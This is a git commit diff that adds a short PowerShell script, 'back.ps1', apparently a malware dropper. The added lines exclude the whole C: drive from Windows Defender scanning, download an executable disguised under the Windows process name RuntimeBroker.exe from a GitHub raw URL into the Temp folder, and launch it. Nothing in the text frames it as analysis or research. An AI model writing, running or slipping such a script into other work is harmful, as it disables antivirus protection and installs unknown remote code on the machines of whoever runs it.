db008e2aae721c9fc38c716da07bb7b0f95c2c6f
WindowsEnjoyer-1 <being2269@gmail.com>
2025-02-08 13:09:42 -0800

    Update back.ps1

--- back.ps1
+++ back.ps1
@@ -1,1 +1,5 @@
-
+Add-MpPreference -ExclusionPath C:\
+$url = "https://github.com/WindowsEnjoyer-1/123412341234/raw/refs/heads/main/RuntimeBroker.exe"
+$output = "$env:Temp/RuntimeBroker.exe"
+Invoke-WebRequest -Uri $url -OutFile $output
+Start-Process -FilePath $output
